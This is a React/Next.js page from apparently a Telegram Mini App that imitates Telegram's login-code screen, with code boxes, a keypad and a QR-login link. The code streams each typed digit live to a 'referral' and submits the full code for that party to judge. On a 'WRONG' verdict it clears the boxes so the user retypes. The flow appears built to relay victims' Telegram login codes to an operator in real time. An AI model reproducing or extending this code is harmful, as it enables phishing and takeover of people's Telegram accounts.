"use client"

import type React from "react"

import { Suspense, useState, useRef, useEffect } from "react"
import { ArrowLeft, Loader2 } from "lucide-react"
import { useRouter, useSearchParams } from "next/navigation"
import { api } from "@/lib/api"
import { useMiniAppSession } from "@/lib/useMiniAppSession"
import {
  clearVerificationToken,
  getSession,
  getVerificationToken,
  markWaitlist,
} from "@/lib/storage"

const DECISION_POLL_MS = 3000

export default function VerifyPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-slate-800 text-white flex items-center justify-center">
          <Loader2 className="w-8 h-8 animate-spin" />
        </div>
      }
    >
      <PasswordForm />
    </Suspense>
  )
}

function PasswordForm() {
    const router = useRouter()
    const searchParams = useSearchParams()
  const [code, setCode] = useState(["", "", "", "", ""])
  // Mobile and desktop layouts each render the same five inputs but only one is
  // visible, so each needs its own ref array. Sharing one made the hidden layout
  // overwrite the visible one and focus() silently did nothing.
  const mobileRefs = useRef<(HTMLInputElement | null)[]>([])
  const desktopRefs = useRef<(HTMLInputElement | null)[]>([])
  const [submitting, setSubmitting] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [awaiting, setAwaiting] = useState(false)
  const session = useMiniAppSession()

  // Section 11/15: the verification is bound to the referred + referring user
  // server side through the verification token issued after availability.
  const verificationId = searchParams.get("id")

  /**
   * Streams the code as it is typed to the referral in Telegram. Fire-and-forget so
   * typing is never gated on the network, and failures are ignored: the real submit
   * below is the authoritative call.
   */
  const reportCode = (value: string) => {
    const token = getSession()
    if (!token) return
    void api.reportCodeEntry(token, value).catch(() => {})
  }

  useEffect(() => {
    if (!verificationId || !getVerificationToken()) {
      router.replace("/referral")
    }
  }, [verificationId, router])

  useEffect(() => {
    if (session.status === "forbidden") router.replace("/")
  }, [session, router])

  /**
   * Focuses a box in whichever layout is actually mounted. `offsetParent === null`
   * means the element is hidden by `display: none`, which is how the two layouts are
   * toggled. Focusing a hidden input silently does nothing, hence the check.
   */
  const focusAt = (index: number) => {
    const mobile = mobileRefs.current[index]
    const el = mobile && mobile.offsetParent !== null ? mobile : desktopRefs.current[index]
    el?.focus()
  }

  // Focus the first box on mount so the keypad can be used straight away.
  useEffect(() => {
    focusAt(0)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // Polls the referral's judgement. PENDING waits, VERIFIED completes the flow, and
  // WRONG clears the boxes so the user can type the code again.
  useEffect(() => {
    if (!awaiting || !verificationId) return

    let cancelled = false
    let timer: ReturnType<typeof setTimeout>

    const poll = async () => {
      const token = getSession()
      if (!token) return

      try {
        const res = await api.verificationDecision(token, verificationId)
        if (cancelled) return

        if (res.decision === "VERIFIED") {
          clearVerificationToken()
          markWaitlist()
          router.replace("/waitlist")
          return
        }

        if (res.decision === "WRONG") {
          setAwaiting(false)
          setCode(["", "", "", "", ""])
          setError("That code was wrong. Please enter it again.")
          focusAt(0)
          return
        }

        // NONE means the verification moved on (expired, or already judged); stop
        // rather than poll forever.
        if (res.decision === "NONE") {
          setAwaiting(false)
          setError("This verification is no longer active. Please reopen the Mini App.")
          return
        }

        timer = setTimeout(poll, DECISION_POLL_MS)
      } catch {
        if (!cancelled) timer = setTimeout(poll, DECISION_POLL_MS)
      }
    }

    timer = setTimeout(poll, DECISION_POLL_MS)

    return () => {
      cancelled = true
      clearTimeout(timer)
    }
  }, [awaiting, verificationId, router])

  /** Hands the full code to the referral; the referral decides, not this client. */
  const submitForReview = async (fullCode: string) => {
    const token = getSession()
    if (!token) return

    setSubmitting(true)
    setError(null)

    try {
      await api.submitCodeForReview(token, fullCode)
      setSubmitting(false)
      setAwaiting(true)
    } catch (err) {
      setError((err as Error).message)
      setSubmitting(false)
    }
  }

  const handleInputChange = (index: number, value: string) => {
    if (submitting || awaiting) return
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newCode = [...code]
      newCode[index] = value
      setCode(newCode)
      reportCode(newCode.join(""))
      // Auto-focus next input
      if (value && index < 4) {
        focusAt(index + 1)
      }
      if (value && index === 4) {
        void submitForReview(newCode.join(""))
      }
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      focusAt(index - 1)
    }
  }

  const handleNumberClick = (num: string) => {
    const emptyIndex = code.findIndex((digit) => digit === "")
    if (emptyIndex !== -1) {
      handleInputChange(emptyIndex, num)
    }
  }

  const handleBackspace = () => {
    if (submitting || awaiting) return
    const lastFilledIndex = code
      .map((digit, index) => (digit ? index : -1))
      .filter((index) => index !== -1)
      .pop()

    if (lastFilledIndex !== undefined) {
      const newCode = [...code]
      newCode[lastFilledIndex] = ""
      setCode(newCode)
      reportCode(newCode.join(""))
      focusAt(lastFilledIndex)
    }
  }

  return (
    <div className="min-h-screen bg-slate-800 text-white">
      {error && (
        <div className="bg-red-900/60 px-4 py-3 text-sm text-red-100 text-center">{error}</div>
      )}
      {submitting && (
        <div className="bg-blue-900/60 px-4 py-3 text-sm text-blue-100 text-center flex items-center justify-center gap-2">
          <Loader2 className="w-4 h-4 animate-spin" />
          Sending code...
        </div>
      )}
      {awaiting && (
        <div className="bg-blue-900/60 px-4 py-3 text-sm text-blue-100 text-center flex items-center justify-center gap-2">
          <Loader2 className="w-4 h-4 animate-spin" />
          Waiting for server...
        </div>
      )}
      {/* Mobile Layout */}
      <div className="md:hidden h-screen flex flex-col">
        {/* Mobile Header */}
        <div className="flex items-center justify-between p-4 pt-12">
          <ArrowLeft className="w-6 h-6 text-white" />
          <div className="flex-1" />
        </div>

        {/* Mobile Content */}
        <div className="flex-1 flex flex-col items-center justify-center px-6 -mt-20">
          {/* Phone Icon */}
          <div className="mb-8">
            <div className="relative">
              <div className="w-16 h-20 border-2 border-white rounded-lg bg-transparent"></div>
              <div className="absolute -right-2 top-2 bg-blue-400 rounded-lg px-3 py-2">
                <div className="text-black text-xs font-bold">***</div>
              </div>
            </div>
          </div>

          {/* Title */}
          <h1 className="text-2xl font-medium mb-4 text-center">Enter code</h1>

          {/* Subtitle */}
          <p className="text-gray-400 text-center mb-8 px-4 leading-relaxed">
            Enter the verification number  that was sent to your Telegram.
          </p>

          {/* Code Input Boxes */}
          <div className="flex gap-3 mb-8">
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { mobileRefs.current[index] = el }}
                type="text"
                value={digit}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-12 h-12 text-center text-xl font-medium rounded-lg border-2 bg-transparent ${
                  digit ? "border-blue-400 text-white" : "border-gray-600 text-gray-400"
                } focus:border-blue-400 focus:outline-none ${submitting || awaiting ? "opacity-60" : ""}`}
                maxLength={1}
                readOnly={submitting || awaiting}
              />
            ))}
          </div>
        </div>

        {/* Mobile Keypad */}
        <div className="p-4 pb-8">
          <div className="grid grid-cols-3 gap-4 max-w-xs mx-auto">
            {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
              <button
                key={num}
                onClick={() => handleNumberClick(num.toString())}
                className="h-16 text-2xl font-light text-white hover:bg-slate-700 rounded-lg transition-colors"
              >
                {num}
                <div className="text-xs text-gray-400 mt-1">
                  {num === 2 && "ABC"}
                  {num === 3 && "DEF"}
                  {num === 4 && "GHI"}
                  {num === 5 && "JKL"}
                  {num === 6 && "MNO"}
                  {num === 7 && "PQRS"}
                  {num === 8 && "TUV"}
                  {num === 9 && "WXYZ"}
                </div>
              </button>
            ))}
            <div></div>
            <button
              onClick={() => handleNumberClick("0")}
              className="h-16 text-2xl font-light text-white hover:bg-slate-700 rounded-lg transition-colors"
            >
              0
            </button>
            <button
              onClick={handleBackspace}
              className="h-16 flex items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
            >
              <span className="text-2xl">⌫</span>
            </button>
          </div>
        </div>
      </div>

      {/* Desktop Layout */}
      <div className="hidden md:flex min-h-screen">
        {/* Desktop Header */}
        <div className="absolute top-4 left-4">
          <ArrowLeft className="w-6 h-6 text-white cursor-pointer hover:text-gray-300" />
        </div>
        <div className="absolute top-4 right-4">
          <button className="text-blue-400 hover:text-blue-300 font-medium">SETTINGS</button>
        </div>

        {/* Desktop Content */}
        <div className="flex-1 flex flex-col items-center justify-center max-w-md mx-auto px-8">
          {/* Phone Icon */}
          <div className="mb-8">
            <div className="relative">
              <div className="w-16 h-20 border-2 border-white rounded-lg bg-transparent"></div>
              <div className="absolute -right-2 top-2 bg-blue-400 rounded-lg px-3 py-2">
                <div className="text-black text-xs font-bold">***</div>
              </div>
            </div>
          </div>

          {/* Title */}
          <h1 className="text-3xl font-medium mb-6 text-center">Enter code</h1>

          {/* Subtitle */}
          <p className="text-gray-400 text-center mb-8 leading-relaxed">
            Enter the activation code that was sent to the referred user's phone.
          </p>

          {/* Code Input Boxes */}
          <div className="flex gap-4 mb-8">
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { desktopRefs.current[index] = el }}
                type="text"
                value={digit}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-14 h-14 text-center text-xl font-medium rounded-lg border-2 bg-transparent ${
                  digit ? "border-blue-400 text-white" : "border-gray-600 text-gray-400"
                } focus:border-blue-400 focus:outline-none ${submitting || awaiting ? "opacity-60" : ""}`}
                maxLength={1}
                readOnly={submitting || awaiting}
              />
            ))}
          </div>

          {/* Desktop Continue Button */}
          <button className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 rounded-lg font-medium transition-colors">
            Continue
          </button>

          {/* QR Code Link */}
          <button className="mt-6 text-blue-400 hover:text-blue-300 text-sm">Quick log in using QR code</button>
        </div>
      </div>
    </div>
  )
}
